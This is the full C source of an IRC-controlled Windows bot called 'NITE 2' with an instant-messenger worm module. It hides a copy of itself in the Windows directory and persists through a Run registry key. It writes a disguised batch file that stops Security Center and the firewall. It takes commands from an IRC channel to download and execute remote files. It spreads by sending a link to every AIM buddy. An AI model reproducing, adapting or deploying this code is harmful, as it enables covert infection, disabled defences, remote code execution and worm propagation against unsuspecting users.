/*
   NITE 2 * by m1rr0r
	% AIM SPREAD %
*/

#include "main.h"
#include "config.h"

HWND Window;
SOCKET sock;
char target[MAX_PATH];
HANDLE ih;
HKEY reg;
char path[512];
char nick[32];
link_t link;
cAim_t aim;
char url[512];
char dest[512];
int run,update;
BOOL AIM,removee,re=FALSE;
DWORD aimTHREAD,regADD;
char channel[512];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	int err = 0;
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, mutex), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);
	WSADATA WSAdata;
	if ((err = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		WSACleanup();
		return 0;
	}
	ZeroMemory(target, sizeof(target));
	ZeroMemory(path, sizeof(path));
	GetModuleFileName(GetModuleHandle(NULL), path, sizeof(path));
	GetWindowsDirectory(target, sizeof(target));
	SetCurrentDirectory(target);
	wsprintf(exe, "\\%s", exe);
	strcat(target, exe);
	CopyFile(path, target, FALSE);
	SetFileAttributes(target, FILE_ATTRIBUTE_SYSTEM);
	SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);
	HANDLE f;
	char batfile[256];
	CreateThread(NULL, 0, &regadd, NULL, 0, &regADD);
		char buffer1[] = "@echo off\r\n"
		"@title Windows Update\r\n"
		"net stop \"Security Center\"\r\n"
		"net stop SharedAccess\r\n";
	sprintf(batfile, "c:\\a.bat");
	if ((f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0)) > (HANDLE)0)
    {
    DWORD r;
		WriteFile(f, buffer1, strlen(buffer1), &r, NULL);
		CloseHandle(f);
		ShellExecute(0, "open", batfile, NULL, NULL, SW_HIDE);
	}
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD errr;
	char *ptr;
	char buff[4096],buffer[100];;
	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dns);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dns);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
		memset(nick, 0, sizeof(nick));
		re = FALSE;
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		errr = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		} else {
			rndnick();
			if (pass[0] != NULL) { sprintf(buffer,"PASS %s\r\n",pass); send(sock, buffer, lstrlen(buffer), 0); }
			wsprintf(buffer, "USER %s %s %s :%s\r\nNICK %s\r\n", nick, nick, nick, nick, nick);
			send(sock, buffer, lstrlen(buffer), 0);
			while (re != TRUE)
			{
				if (removee == TRUE)
				{
					uninstall();
					WSACleanup();
					ExitProcess(0);
				}
				memset(buffer, 0, sizeof(buffer));
				ZeroMemory(buffer, sizeof(buffer));
				if((recv(sock, buffer, sizeof(buffer), 0)) <= 0)
					re = TRUE;
				parse(buffer);
				ptr = strstr(buffer, "\r\n");
				while (ptr != 0)
				{
					ptr = ptr + 2;
					parse(ptr);
					ptr = strstr(ptr, "\r\n");	
				}
			}
		}
		closesocket(sock);
	}
	WSACleanup();
	return 0;
 }

DWORD WINAPI regadd(void *pVoid)
{
	while(1)
	{
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
		RegSetValueEx(reg, regk, 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
		RegCloseKey(reg);
		Sleep(120000);
	}
}

int parse(char *line)
{
	char *arg[32];
	char buffer[2048];
	int i,x,s;
	if (strstr(line, "KICK") != NULL)
	{
		wsprintf(buffer, "JOIN %s %s\r\n", chan, chankey);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	line[lstrlen(line)-2] = 0;
	arg[0] = strtok(line, " ");
	for (i = 1; i < 32; i++) arg[i] = strtok(NULL, " ");
	if (lstrcmp(arg[0],"PING") == 0)
	{
		wsprintf(buffer, "PONG %s\r\nJOIN %s %s\r\n", arg[1], chan, chankey);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (lstrcmp(arg[1],"001") == 0)
	{
		wsprintf(buffer, "JOIN %s %s\r\n", chan, chankey);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (lstrcmp(arg[1],"010") == 0)
	{
		closesocket(sock);
	}
	if (lstrcmp(arg[1],"PRIVMSG") == 0)
	{
		if (arg[2][1] == 35)
		{
			strcpy(channel, arg[2]);
		}
		else {
			strcpy(channel, chan);
		}
	}
	if ((strstr(arg[0], host) != NULL))
	{
		strcpy(buffer,"");
		for (i=4; i<32; i++)
		{
			if (lstrlen(arg[i]) > 0)
			{
				if (i == 5) strcpy(buffer, arg[i]);
				else 
				{
					strcat(buffer," ");
					strcat(buffer,arg[i]);
				}
			}
		}
		if ((lstrcmp(arg[3],":r") == 0))
		{
			uninstall();
			WSACleanup();
			ExitProcess(0);
		}
		if ((lstrcmp(arg[3],":c") == 0))
		{
			re = TRUE;
		}
		if ((lstrcmp(arg[3],":a") == 0)||(lstrcmp(arg[4],":a") == 0))
		{
			if ( AIM != TRUE )
			{
				char linke[512];
				strcpy(linke,"");
				for ( int x = 0; arg[x+4] != NULL; x++) wsprintf(linke, "%s %s", linke, arg[x+4]);
				link.link = linke;
				aim.x = TRUE;
				if((CreateThread(NULL,0,AIMSpread,0,NULL,&aimTHREAD)) != 0)
				{
					AIM = TRUE;
				}
			}
		}
		if ((lstrcmp(arg[3],":d") == 0)) {
				DWORD thread;
				strncpy(url,  arg[4], sizeof(url)-1);
				strncpy(dest,  arg[5], sizeof(dest)-1);
				if (arg[6] != NULL) run = atoi(arg[6]); else run = 0;
				if (arg[7] != NULL) update = atoi(arg[7]); else update = 0;
				CreateThread(NULL, 0, &dwl, NULL, 0, &thread);
		}
	}
	return 0;
}

void rndnick()
{
	int i;
	srand(GetTickCount());
	sprintf(nick, "%s", prefix);
	for (i=1; i<=nl; i++) sprintf(nick, "%s%i", nick, rand()%10);
}

void uninstall(void)
{
		HKEY reg;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
		RegSetValueEx(reg, regk, 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
		RegDeleteValue(reg, regk);
		RegCloseKey(reg);
}

DWORD WINAPI dwl(void *pVoid)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char buffer[1024];
	fh = InternetOpenUrl(ih, url, NULL, 0, 0, 0);
	if (fh != NULL) {
		f = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1) {
			return 0;
		}
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
		} while (r > 0);
		CloseHandle(f);
		if (run == 1)
		{
			ShellExecute(0, "open", dest, NULL, NULL, SW_SHOW);
		}
		if (update == 1)
		{
			removee = TRUE;
		}
	} 
	InternetCloseHandle(fh);
	return 0;
 }

HWND FindBuddyList()
{
	HWND oscarNotify = FindWindow("_Oscar_StatusNotify", NULL);
	if ( IsWindow(oscarNotify) )
	{
		SendMessage(oscarNotify, WM_COMMAND, 20003, 0);
		HWND buddyList = 0;
		HWND aimAd = 0;
		do
		{
			buddyList = FindWindowEx(0, buddyList, "#32770", NULL);
			if ( IsWindow(buddyList) )
			{
				aimAd = FindWindowEx(buddyList, 0, "_AimAd", NULL);
				if ( IsWindow(aimAd) )
				{
					return buddyList;
				}
			}
		}
		while ( IsWindow(buddyList) );
	}
	return 0;
}
void SendIM(HWND imWindow, LPCTSTR message)
{
	HWND textBox = 0;
	HWND wndAte = 0;
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "WndAte32Class", NULL);
		if ( IsWindow(wndAte) )
		{
            textBox = FindWindowEx(wndAte, 0, "CBClass", NULL);
			if ( IsWindow(textBox) )
			{
				textBox = FindWindowEx(wndAte, 0, "Ate32Class", NULL);
				SendMessage(textBox, WM_SETTEXT, 0, (LPARAM)message);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "_Oscar_IconBtn", NULL);
		if ( IsWindow(wndAte) )
		{
			if ( ((int)GetMenu(wndAte)) == 409 )
			{
				SendMessage(wndAte, WM_LBUTTONDOWN, 0, 0);
				SendMessage(wndAte, WM_LBUTTONUP, 0, 0);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
}
void IMAllWindows(LPCTSTR message)
{
	HWND imWindow = 0;
	do
	{
		imWindow = FindWindowEx(0, 0, "AIM_IMessage", NULL);
		if ( IsWindow(imWindow) )
		{
			SendIM(imWindow, message);
			SendMessage(imWindow, WM_CLOSE, 0, 0);
		}
		Sleep(4000);
	}
	while ( IsWindow(imWindow) );
}

void IMAll(HWND buddyList, LPCTSTR message)
{
	HWND oscarTree = FindWindowEx(buddyList, 0, "#32770", NULL);
	oscarTree = FindWindowEx(oscarTree, 0, "_Oscar_Tree", NULL);
	if ( IsWindow(oscarTree) )
	{
		int itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		int itemIndex = -1;
		while ( itemCount > itemIndex )
		{
			SendMessage(oscarTree, LB_SETCURSEL, ++itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);
			SendMessage(oscarTree, WM_KEYUP, 37, 0);
		}
		itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		itemIndex = itemCount;
		--itemIndex;
		while (( --itemIndex >= 0 ) && (aim.x))
		{
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 39, 0);
			SendMessage(oscarTree, WM_KEYUP, 39, 0);
			int temp = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
			temp -= ( itemCount - itemIndex );
			for ( int i = itemIndex + 1; i <= temp; ++i )
			{
				SendMessage(oscarTree, LB_SETCURSEL, i, 0);
				SendMessage(buddyList, WM_COMMAND, 139, 0);
				IMAllWindows(message);
			}
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);
			SendMessage(oscarTree, WM_KEYUP, 37, 0);
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
		}
	}
}

DWORD WINAPI AIMSpread (void *pVoid) {
	string msg = link.link;
	HWND buddyList = FindBuddyList();
	if ( IsWindow(buddyList) )
		IMAll(buddyList, msg.c_str() );
	AIM = FALSE;
	return 0;
}
